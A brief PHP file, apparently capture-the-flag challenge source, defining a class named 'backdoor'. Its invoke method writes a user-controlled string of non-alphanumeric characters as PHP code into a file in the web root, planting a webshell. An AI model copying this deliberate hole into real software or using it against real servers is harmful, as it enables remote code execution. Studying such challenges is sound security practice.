<?php
class backdoor {
    protected
        //! eval code
        $cmd;

    public function __invoke() {
        if(preg_match('/^[;+=!@\$\"\.\_\(\)\[\]]{1,}$/i',$this->cmd)) {
            file_put_contents("/var/www/html/neepu.php", "<?php ".$this->cmd);
        }
        else{
            die("A webshell is waiting for you");
        }
    }
}